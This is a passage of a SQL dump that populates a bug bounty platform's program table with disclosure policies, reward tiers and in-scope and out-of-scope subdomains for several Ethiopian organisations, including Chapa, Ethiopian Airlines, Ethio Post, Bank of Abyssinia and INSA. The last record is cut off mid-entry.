INSERT INTO `bounty_programs` VALUES (3,'Chapa','https://chapa.co/','http://localhost:5000/uploads/1723843866192-425aee81-6ca1-4282-ab18-bb1d59fdea05_1704500949730.jpg','<p>This program is for the disclosure of software security vulnerabilities only.</p>\n<p><strong>Introduction</strong><br>Security researchers play a crucial role in ensuring the safety and security of Chapa’s products and services. Chapa actively encourages the responsible disclosure of security vulnerabilities through our Bug Bounty Program. By participating, you help us protect our customers and stakeholders while potentially earning rewards and recognition for your efforts.</p>\n<p>This Program focuses on identifying and reporting security vulnerabilities in Chapa’s online services and infrastructure. To qualify for a reward, a report must clearly demonstrate a software vulnerability that impacts Chapa or its customers. Chapa will determine, at its sole discretion, whether a report meets the eligibility criteria for a bounty and the amount of the reward.</p>\n<p><strong>Program Rules</strong></p>\n<ul>\n<li>Make a good faith effort to avoid privacy violations, destruction of data, or any interruption of our services. Only interact with accounts you own or have explicit permission to test.</li>\n<li>Do not use the discovered vulnerability for any purpose other than submitting it through this Program. Public disclosure or profiteering is prohibited.</li>\n<li>Follow responsible disclosure guidelines. Any public disclosure of vulnerabilities is prohibited without Chapa\'s consent. Public disclosure requests will not be approved until the vulnerability has been resolved.</li>\n<li>Provide detailed reports with reproducible steps. Reports that are not detailed enough to reproduce the issue will not be eligible for a reward.</li>\n<li>Submit only one vulnerability per submission unless you need to chain vulnerabilities to demonstrate impact.</li>\n<li>In case of duplicate reports, only the first submission will be eligible for a reward.</li>\n<li>By submitting a report, you agree to be bound by these rules.</li>\n</ul>\n<p><strong>Report Evaluation</strong></p>\n<ul>\n<li>A report must demonstrate a valid vulnerability within the scope to be considered for a bounty.</li>\n<li>Reports without a valid Proof-of-Concept may have reduced rewards, depending on the reproducibility and severity of the issue.</li>\n<li>Bounties are awarded based on the severity of the vulnerability, its impact, and the quality of the report.</li>\n</ul>\n<p><span style=\"color: rgb(0,0,0);font-size: medium;font-family: Poppins, sans-serif;\"><strong>Vulnerability Categories for Chapa Bug Bounty Program</strong></span><br></p>\n<p style=\"text-align:start;\"><span style=\"color: rgb(0,0,0);font-size: medium;font-family: Poppins, sans-serif;\"><strong> Low Severity</strong></span></p>\n<ul>\n<li><span style=\"color: rgb(0,0,0);font-size: medium;font-family: Poppins, sans-serif;\"><em>Minor Info Disclosure</em></span></li>\n<li><span style=\"color: rgb(0,0,0);font-size: medium;font-family: Poppins, sans-serif;\"><em>Low-Impact XSS</em></span></li>\n<li><span style=\"color: rgb(0,0,0);font-size: medium;font-family: Poppins, sans-serif;\"><em>Open Redirects</em></span></li>\n</ul>\n<p style=\"text-align:start;\"><span style=\"color: rgb(0,0,0);font-size: medium;font-family: Poppins, sans-serif;\"><strong> Medium Severity</strong></span></p>\n<ul>\n<li><span style=\"color: rgb(0,0,0);font-size: medium;font-family: Poppins, sans-serif;\"><em>CSRF</em></span></li>\n<li><span style=\"color: rgb(0,0,0);font-size: medium;font-family: Poppins, sans-serif;\"><em>Stored XSS</em></span></li>\n<li><span style=\"color: rgb(0,0,0);font-size: medium;font-family: Poppins, sans-serif;\"><em>SQL Injection (Low)</em></span></li>\n<li><span style=\"color: rgb(0,0,0);font-size: medium;font-family: Poppins, sans-serif;\"><em>Session Fixation</em></span></li>\n<li><span style=\"color: rgb(0,0,0);font-size: medium;font-family: Poppins, sans-serif;\"><em>Insecure Direct Object Reference (IDOR)</em></span></li>\n</ul>\n<p style=\"text-align:start;\"><span style=\"color: rgb(0,0,0);font-size: medium;font-family: Poppins, sans-serif;\"><strong> High Severity</strong></span></p>\n<ul>\n<li><span style=\"color: rgb(0,0,0);font-size: medium;font-family: Poppins, sans-serif;\"><em>SQL Injection (High)</em></span></li>\n<li><span style=\"color: rgb(0,0,0);font-size: medium;font-family: Poppins, sans-serif;\"><em>Sensitive Data Exposure</em></span></li>\n<li><span style=\"color: rgb(0,0,0);font-size: medium;font-family: Poppins, sans-serif;\"><em>Significant XSS</em></span></li>\n<li><span style=\"color: rgb(0,0,0);font-size: medium;font-family: Poppins, sans-serif;\"><em>Server-Side Request Forgery (SSRF)</em></span></li>\n<li><span style=\"color: rgb(0,0,0);font-size: medium;font-family: Poppins, sans-serif;\">Broken Authentication</span></li>\n<li><span style=\"color: rgb(0,0,0);font-size: medium;font-family: Poppins, sans-serif;\">XML External Entity (XXE)</span></li>\n<li><span style=\"color: rgb(0,0,0);font-size: medium;font-family: Poppins, sans-serif;\">Insecure Deserialization</span></li>\n<li><span style=\"color: rgb(0,0,0);font-size: medium;font-family: Poppins, sans-serif;\"><em>Privilege Escalation</em></span>&nbsp;</li>\n</ul>\n<p><strong>VulnerabilityReward</strong></p>\n<p><em>Note: The rewards listed are maximum bounties for each tier. The actual amount awarded will depend on factors such as the bug\'s impact, the report\'s quality, and whether a solution is suggested.</em></p>\n<p><strong>Report Closure</strong></p>\n<ul>\n<li>Chapa reviews all submissions to ensure validity. If additional information is needed, Chapa may request further details.</li>\n<li>Reports that are not reproducible, invalid, or informational in nature will be closed without a reward.</li>\n<li>Detailed information and evidence are required to support all reports. Reports submitted outside the designated disclosure platform will not be considered for a bounty.</li>\n</ul>\n<p><strong>Scope</strong></p>\n<ul>\n<li><strong>In-Scope Domains</strong>: All subdomains under <code>*.chapa.co</code>.</li>\n<li><strong>Out of Scope</strong>: <code>internal.chapa.co</code>.</li>\n</ul>\n<p><strong>Non-Qualifying Vulnerabilities</strong></p>\n<ul>\n<li>Unexploitable hypothetical vulnerabilities.</li>\n<li>Vulnerabilities in third-party libraries unless they affect the core functionality of Chapa’s services.</li>\n</ul>\n<p><strong>Qualifying Vulnerabilities</strong></p>\n<ul>\n<li>Security issues affecting Chapa’s online services and infrastructure, such as:</li>\n<ul>\n<li>Bugs in the implementation of security protocols.</li>\n<li>Remote Code Execution.</li>\n<li>Vulnerabilities affecting service stability, availability, or data integrity.</li>\n</ul>\n</ul>\n<p><strong>Disclaimer</strong></p>\n<ul>\n<li>A1ET reserves the right to cancel the Program at any time.</li>\n<li>Chapa will determine at its discretion whether a vulnerability is eligible for a reward and the amount of the reward based on the severity of the issue.&nbsp;</li>\n</ul>\n','3000','10000',20000,50000,'<ul>\n<li style=\"margin-left:1.5em;\"><span style=\"color: rgb(82,95,127);background-color: rgb(248,249,250);font-size: 16px;font-family: Open Sans\", sans-serif;\"><strong>In-Scope Domains</strong>: All subdomains under </span><span style=\"color: rgb(82,95,127);background-color: rgb(241,241,241);font-size: 16px;font-family: monospace;\">*.chapa.co</span><span style=\"color: rgb(82,95,127);background-color: rgb(248,249,250);font-size: 16px;font-family: Open Sans\", sans-serif;\">.</span></li>\n<li style=\"margin-left:1.5em;\"><span style=\"color: rgb(82,95,127);background-color: rgb(248,249,250);font-size: 16px;font-family: Open Sans\", sans-serif;\"><strong>Out of Scope</strong>: </span><span style=\"color: rgb(82,95,127);background-color: rgb(241,241,241);font-size: 16px;font-family: monospace;\">internal.chapa.co</span><span style=\"color: rgb(82,95,127);background-color: rgb(248,249,250);font-size: 16px;font-family: Open Sans\", sans-serif;\">.</span>&nbsp;</li>\n</ul>\n','2024-08-16 21:31:26','2024-08-16 21:31:26'),(4,'Ethiopian Airlines','https://www.ethiopianairlines.com/','http://localhost:5000/uploads/1723844466355-4af335d2-0b94-4a2c-ab1f-323f7c4e6400_now.jpg','<h3>Program Overview</h3>\n<p><br>Ethiopian Airlines is committed to collaborating with A1ET the security community to find vulnerabilities that could affect our services and customers. We value your contributions to maintaining our security posture.</p>\n<h3>Disclosure Policy</h3>\n<p>Please do not discuss this program or any vulnerabilities (even resolved ones) outside of the program without express consent from Ethiopian Airlines.<br>Follow Ethiopian Airlines\' disclosure guidelines.</p>\n<h3>Program Rules</h3>\n<ul>\n<li>Provide detailed reports with reproducible steps. If the report is not detailed enough to reproduce the issue, the issue will not be eligible for a reward.</li>\n<li>Submit one vulnerability per report, unless chaining vulnerabilities to demonstrate a broader impact.</li>\n<li>When duplicates occur, we only award the first report received that can be fully reproduced.</li>\n<li>Multiple vulnerabilities caused by a single underlying issue will be awarded as one bounty.</li>\n<li>Social engineering (e.g., phishing, vishing, smishing) is strictly prohibited.</li>\n<li>Make a good faith effort to avoid privacy violations, destruction of data, and interruption or degradation of our service.</li>\n<li>Ask the program team before testing vulnerabilities on unscoped subdomains.</li>\n<li>Only interact with accounts you own or have explicit permission from the account holder.</li>\n</ul>\n<h3>Out of Scope Vulnerabilities</h3>\n<p>When reporting vulnerabilities, consider the following issues out of scope:</p>\n<ul>\n<li>CRLF Injection</li>\n<li>Self-XSS</li>\n<li>Tabnabbing</li>\n<li>Email Spoofing</li>\n<li>Session Fixation</li>\n<li>Content Spoofing</li>\n<li>Account brute force</li>\n<li>Missing cookie flags</li>\n<li>Best practices/issues</li>\n<li>HTML content injection</li>\n<li>Clickjacking/UI redressing</li>\n<li>DOM Cross-site Scripting (XSS)</li>\n<li>Reflected Cross-site Scripting (XSS)</li>\n<li>HTTPS/SSL/TLS Related Issues</li>\n<li>Physical or social engineering attacks</li>\n<li>Vulnerabilities affecting outdated browsers or platforms</li>\n<li>Rate limiting or brute force issues on non-authentication endpoints</li>\n<li>Error information disclosure that cannot be directly exploited</li>\n</ul>\n<p><strong>Thank you for helping keep Ethiopian Airlines and our passengers safe!</strong>&nbsp;</p>\n','8000','31000',56000,85000,'<p style=\"text-align:left;\"><span style=\"color: rgb(50,50,93);font-size: 24px;font-family: Open Sans\", sans-serif;\">In scope</span></p>\n<p><span style=\"color: rgb(97,189,109);\">admin.ethiopianairlines.com</span></p>\n<p><span style=\"color: rgb(97,189,109);\">agency.ethiopianairlines.com</span></p>\n<p><span style=\"color: rgb(97,189,109);\">agencyportal.ethiopianairlines.com</span></p>\n<p><span style=\"color: rgb(97,189,109);\">api-dev-iam.ethiopianairlines.com</span></p>\n<p><span style=\"color: rgb(97,189,109);\">api-iam.ethiopianairlines.com</span></p>\n<p><span style=\"color: rgb(97,189,109);\">api-successwing.ethiopianairlines.com</span></p>\n<p><span style=\"color: rgb(97,189,109);\">*.alpha.ethiopianairlines.com</span></p>\n<p><span style=\"color: rgb(97,189,109);\">*.catering.ethiopianairlines.com</span></p>\n<p></p>\n<p style=\"text-align:left;\"><span style=\"color: rgb(50,50,93);font-size: 24px;font-family: Open Sans\", sans-serif;\">Out of scope Assets</span>&nbsp;</p>\n<p><span style=\"color: rgb(226,80,65);\">*.flight.ethiopianairlines.com</span></p>\n<p><span style=\"color: rgb(226,80,65);\">api.dev.flygate.ethiopianairlines.com</span></p>\n<p><span style=\"color: rgb(226,80,65);\">api.dev.pms.ethiopianairlines.com</span></p>\n<p><span style=\"color: rgb(226,80,65);\">api.staging.alpha.ethiopianairlines.com</span></p>\n<p><span style=\"color: rgb(226,80,65);\">api.staging.catering.ethiopianairlines.com</span></p>\n<p><span style=\"color: rgb(226,80,65);\">api.staging.flight.ethiopianairlines.com</span></p>\n<p><span style=\"color: rgb(226,80,65);\">api.staging.pms.ethiopianairlines.com</span></p>\n<p><span style=\"color: rgb(226,80,65);\">autodiscover.ethiopianairlines.com</span></p>\n<p><span style=\"color: rgb(226,80,65);\">betaholidays.ethiopianairlines.com</span></p>\n<p><span style=\"color: rgb(226,80,65);\">betashebamiles.ethiopianairlines.com</span></p>\n<p><span style=\"color: rgb(226,80,65);\">bi.ethiopianairlines.com</span></p>\n','2024-08-16 21:48:23','2024-08-16 21:48:23'),(5,'Ethio Post','https://ethio.post/','http://localhost:5000/uploads/1723845544531-f9da6d3b-2dbd-4d16-bf4f-7bba6854fb5c_images.png','<h3>Overview</h3>\n<p>EthioPost is committed to working with the security community to identify and mitigate vulnerabilities that could affect the integrity, availability, or confidentiality of our services. We invite security researchers to report any potential security issues they find in our systems, following the guidelines provided below.</p>\n<h3>Scope</h3>\n<p>The scope of this bug bounty program includes any vulnerabilities related to EthioPost\'s digital platforms and services. Security researchers are encouraged to test across all regions and services to ensure comprehensive coverage of EthioPost’s offerings. Please ensure testing is conducted in a non-disruptive manner, especially when interacting with live environments.</p>\n<h3>Test Plan</h3>\n<p>To get started with testing, follow these steps:</p>\n<ol>\n<li>Visit the EthioPost official website.</li>\n<li>Log in or create a testing account using the \'Sign Up\' option.</li>\n<li>Use the testing environment, where applicable, to avoid disrupting live services.</li>\n<li>Review the documentation and resources available on the EthioPost developer portal for more detailed guidance.</li>\n</ol>\n<h3></h3>\n<h3>Disclosure Policy</h3>\n<p>Please do not publicly disclose any vulnerabilities until they have been resolved and you have received explicit permission from EthioPost to do so. All reports should adhere to responsible disclosure practices.</p>\n<h3>Program Rules</h3>\n<ul>\n<li>Provide detailed reports with clear, reproducible steps.</li>\n<li>Submit one vulnerability per report, unless chaining vulnerabilities is necessary to demonstrate impact.</li>\n<li>Only interact with accounts you own or have explicit permission to use.</li>\n<li>Avoid privacy violations, data destruction, and service disruption.</li>\n<li>Social engineering (e.g., phishing) is prohibited.</li>\n</ul>\n<h3>Out-of-Scope Vulnerabilities</h3>\n<p>The following issues are generally considered out of scope:</p>\n<ul>\n<li>Clickjacking on pages without sensitive actions</li>\n<li>CSRF on unauthenticated or non-sensitive forms</li>\n<li>Vulnerabilities requiring MITM or physical access to a user\'s device</li>\n<li>Issues related to outdated browsers or platforms</li>\n<li>Rate limiting or brute-force issues on non-authentication endpoints</li>\n<li>Open redirect vulnerabilities, unless a significant impact is demonstrated</li>\n<li>Issues with third-party software or services not directly managed by EthioPost</li>\n</ul>\n<h3>Legal</h3>\n<p>By participating in this program, you agree to comply with all applicable laws and regulations. You also agree to keep any information obtained during testing confidential and not to use it for any purpose other than submitting a vulnerability report to EthioPost.</p>\n<p>We appreciate the efforts of the security community in helping to protect our customers and services. Thank you for your contributions to keeping EthioPost secure.&nbsp;</p>\n','5000','10000',20000,40000,'<p style=\"text-align:left;\"><span style=\"color: rgb(50,50,93);font-size: 24px;font-family: Open Sans\", sans-serif;\">In scope</span>&nbsp;</p>\n<p><span style=\"color: rgb(97,189,109);\">contactcenter.ethio.post</span></p>\n<p><span style=\"color: rgb(97,189,109);\">eprocurement.ethio.post</span></p>\n<p><span style=\"color: rgb(97,189,109);\">mail.ethio.post</span></p>\n<p><span style=\"color: rgb(97,189,109);\">mytime.ethio.post</span></p>\n<p><span style=\"color: rgb(97,189,109);\">opportunities.ethio.post</span></p>\n<p><span style=\"color: rgb(97,189,109);\">postbox.ethio.post</span></p>\n<p><span style=\"color: rgb(97,189,109);\">*.realtime.ethio.post</span></p>\n<p style=\"text-align:left;\"><span style=\"color: rgb(50,50,93);font-size: 24px;font-family: Open Sans\", sans-serif;\">Out of scope Assets</span>&nbsp;</p>\n<p><span style=\"color: rgb(226,80,65);\">*.staff.ethio.post</span></p>\n<p><span style=\"color: rgb(226,80,65);\">*.webmail.ethio.post</span></p>\n<p><span style=\"color: rgb(226,80,65);\">*.mytime.ethio.post</span></p>\n<p></p>\n','2024-08-16 22:01:41','2024-08-16 22:01:41'),(6,'Bank of Abyssinia','https://www.bankofabyssinia.com/','http://localhost:5000/uploads/1723846964168-a34b16d6-e886-49cb-a3ac-4d2e55780192_images (1).png','<h3></h3>\n<p>At Abyssinia Bank, the security and protection of our customers\' data and financial assets are our highest priorities. We are committed to working with the security community to identify and resolve any potential vulnerabilities in our systems. This Vulnerability Disclosure Policy outlines the steps we encourage security researchers to follow when reporting vulnerabilities.</p>\n<h3>Reporting a Vulnerability</h3>\n<p>If you believe you have identified a security vulnerability in any of Abyssinia Bank\'s digital platforms, services, or infrastructure, please report it to us by following these guidelines:</p>\n<p><strong>Submit Your Report</strong></p>\n<ul>\n<li>A detailed description of the vulnerability.</li>\n<li>Steps to reproduce the issue.</li>\n<li>Any relevant proof-of-concept (PoC) code or screenshots.</li>\n<li>The impact of the vulnerability, including potential risks.</li>\n</ul>\n<p><strong>Act Responsibly</strong>: Please avoid any activities that could harm Abyssinia Bank\'s customers or services, including but not limited to:</p>\n<ul>\n<li>Exploiting the vulnerability beyond what is necessary to confirm its existence.</li>\n<li>Disrupting any services or deleting any data.</li>\n<li>Accessing non-public data beyond what is necessary to demonstrate the vulnerability.</li>\n</ul>\n<p><strong>Confidentiality</strong>: We request that you do not publicly disclose the vulnerability until we have had an opportunity to address it. We are committed to acknowledging and addressing vulnerabilities promptly.</p>\n<h3>What to Expect</h3>\n<ul>\n<li><strong>Assessment</strong>: Our security team will assess the report to verify the vulnerability and determine its impact.</li>\n<li><strong>Resolution</strong>: We will work to resolve confirmed vulnerabilities as quickly as possible, and we may contact you for further information or clarification during this process.</li>\n<li><strong>Notification</strong>: Once the vulnerability has been resolved we may provide recognition for your contribution if you wish.</li>\n</ul>\n<h3>Safe Harbor</h3>\n<p>When conducting vulnerability research in compliance with this policy, Abyssinia Bank considers your activities to be authorized, and we will not pursue legal action against you. However, this policy does not protect you if your actions are found to be illegal or if you do not follow the guidelines outlined in this policy.</p>\n<h3>Scope</h3>\n<p>The following areas are within the scope of this policy:</p>\n<ul>\n<li>Abyssinia Bank\'s online banking platforms.</li>\n<li>API endpoints and web services.</li>\n</ul>\n<p>Out-of-scope issues include:</p>\n<ul>\n<li>Vulnerabilities in third-party systems not managed by Abyssinia Bank.</li>\n<li>Social engineering attacks, including phishing and vishing.</li>\n<li>Denial of Service (DoS) attacks.</li>\n<li>Physical security issues.</li>\n</ul>\n<h3>Legal</h3>\n<p>By submitting a vulnerability report, you agree to comply with all applicable laws and regulations. You also agree to keep the details of the vulnerability confidential until Abyssinia Bank has resolved it.</p>\n<h3>Contact Us</h3>\n<p>If you have any questions or need further information, please contact us at <a href=\"\" target=\"_self\">a</a>1et@gmail.com.</p>\n<p>Thank you for helping us maintain the security and integrity of Abyssinia Bank\'s services.&nbsp;</p>\n','25000','75000',200000,300000,'<p style=\"text-align:left;\"><span style=\"color: rgb(50,50,93);font-size: 24px;font-family: Open Sans\", sans-serif;\">In scope</span>&nbsp;</p>\n<p><span style=\"color: rgb(97,189,109);\">*.boamisbi.bankofabyssinia.com</span></p>\n<p><span style=\"color: rgb(97,189,109);\">collab.bankofabyssinia.com</span></p>\n<p><span style=\"color: rgb(97,189,109);\">erp.bankofabyssinia.com</span></p>\n<p><span style=\"color: rgb(97,189,109);\">ib.bankofabyssinia.com</span></p>\n<p><span style=\"color: rgb(97,189,109);\">mail.bankofabyssinia.com</span></p>\n<p><span style=\"color: rgb(97,189,109);\">portal.bankofabyssinia.com</span></p>\n<p><span style=\"color: rgb(97,189,109);\">ssms.bankofabyssinia.com</span></p>\n<p><span style=\"color: rgb(97,189,109);\">supplier.bankofabyssinia.com</span></p>\n<p style=\"text-align:left;\"><span style=\"color: rgb(50,50,93);font-size: 24px;font-family: Open Sans\", sans-serif;\">Out of scope Assets</span>&nbsp;</p>\n<p><span style=\"color: rgb(226,80,65);\">vacancy.bankofabyssinia.com</span></p>\n<p><span style=\"color: rgb(226,80,65);\">webmail.bankofabyssinia.com</span></p>\n<p><span style=\"color: rgb(226,80,65);\">*.erp.bankofabyssinia.com</span></p>\n<p><span style=\"color: rgb(226,80,65);\">*.supplier.bankofabyssinia.com</span></p>\n<p><span style=\"color: rgb(226,80,65);\">*.vacancy.bankofabyssinia.com</span></p>\n<p></p>\n','2024-08-16 22:24:46','2024-08-16 22:24:46'),(7,'INSA','https://www.insa.gov.et/','http://localhost:5000/uploads/1723847865263-41ee8ba1-1337-40aa-b627-893a49e2a1a3_images (2).png','<h3></h3>\n<p>INSA is committed to safeguarding Ethiopia\'s digital infrastructure and protecting the security of our systems. We value the efforts of security researchers in helping us identify and address potential vulnerabilities. This document outlines our policy for reporting security vulnerabilities.</p>\n<p>We aim to keep you updated on our progress throughout the process.</p>\n<h3>Disclosure Policy</h3>\n<ul>\n<li><strong>Public Disclosure:</strong> We do not permit public disclosure of vulnerabilities. Do not discuss or publish details of any vulnerabilities outside of this program without express consent from INSA.</li>\n<li><strong>Confidentiality:</strong> All details regarding vulnerabilities should remain confidential until we resolve the issue.</li>\n</ul>\n<h3>Program Rules</h3>\n<ul>\n<li><strong>Detailed Reports:</strong> Provide comprehensive reports with clear, reproducible steps. Reports lacking sufficient detail may not be eligible for rewards.</li>\n<li><strong>Single Vulnerability per Report:</strong> Submit one vulnerability per report unless chaining vulnerabilities is necessary to demonstrate impact.</li>\n<li><strong>Duplicates:</strong> Only the first report of a vulnerability will receive a bounty, provided it is fully reproducible.</li>\n<li><strong>Multiple Issues:</strong> Multiple vulnerabilities stemming from a single underlying issue will be awarded one bounty.</li>\n<li><strong>Prohibited Actions:</strong></li>\n<ul>\n<li>Social engineering (e.g., phishing, vishing).</li>\n<li>Exploiting vulnerabilities or disrupting services.</li>\n<li>Using automated scanners or tools.</li>\n</ul>\n</ul>\n<h3>Test Plan</h3>\n<ul>\n<li><strong>Geo-Restrictions:</strong> Use SOCKS/Proxy or VPN to access INSA services from specific regions if necessary for testing.</li>\n<li><strong>Public API Testing:</strong> For information on public APIs, refer to INSA\'s API documentation.</li>\n</ul>\n<h3>Out of Scope Vulnerabilities</h3>\n<p>The following are considered out of scope for this program:</p>\n<ul>\n<li><strong>Non-Impactful Issues:</strong> Clickjacking, theoretical vulnerabilities without demonstrated impact, and basic security misconfigurations.</li>\n<li><strong>Automated Tools:</strong> Reports generated by automated tools or scanners without proof of exploitability.</li>\n<li><strong>Low Impact:</strong> Issues with minimal security impact, such as certain types of content spoofing or rate limiting.</li>\n<li><strong>Third-Party Software:</strong> Vulnerabilities in third-party software not managed by INSA.</li>\n</ul>\n<h3>Safe Harbor</h3>\n<p>Conducting research in accordance with this policy will be considered authorized, and we will not pursue legal action against you. If a third party initiates legal action related to your activities under this policy, we will support your position.</p>\n<p>Thank you for contributing to the security of INSA and helping us protect our digital Ethiopia.&nbsp;</p>\n','28000','51000',78000,90000,'<p style=\"text-align:left;\"><span style=\"color: rgb(50,50,93);font-size: 24px;font-family: Open Sans\", sans-serif;\">In scope</span>&nbsp;</p>\n<p><span style=\"color: rgb(97,189,109);\">accounts.insa.gov.et</span></p>\n<p><span style=\"color: rgb(97,189,109);\">cdev.insa.gov.et</span></p>\n<p><span style=\"color: rgb(97,189,109);\">cds.insa.gov.et</span></p>\n<p><span style=\"color: rgb(97,189,109);\">crtt.insa.gov.et</span></p>\n<p><span style=\"color: rgb(97,189,109);\">crypto.insa.gov.et</span></p>\n<p><span style=\"color: rgb(97,189,109);\">csam.insa.gov.et</span></p>\n<p><span style=\"color: rgb(97,189,109);\">ctf.insa.gov.et</span></p>\n<p><span style=\"color: rgb(97,189,109);\">cychallenge.insa.gov.et</span></p>\n<p><span style=\"color: rgb(97,189,109);\">d